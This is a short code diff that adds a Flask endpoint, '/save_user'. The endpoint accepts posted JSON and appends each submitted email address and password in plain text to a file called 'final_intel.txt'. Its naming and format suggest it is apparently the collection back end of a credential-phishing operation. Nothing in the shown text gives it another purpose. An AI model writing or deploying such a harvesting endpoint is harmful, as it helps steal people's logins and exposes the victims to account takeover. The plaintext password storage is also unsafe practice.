@@ -1,0 +1,6 @@
+@app.route('/save_user', methods=['POST'])
+def save_user():
+    user_data = request.json
+    with open("final_intel.txt", "a") as f:
+        f.write(f"👤 User: {user_data['email']} | 🔑 Pass: {user_data['pass']}\n")
+    return "Received", 200
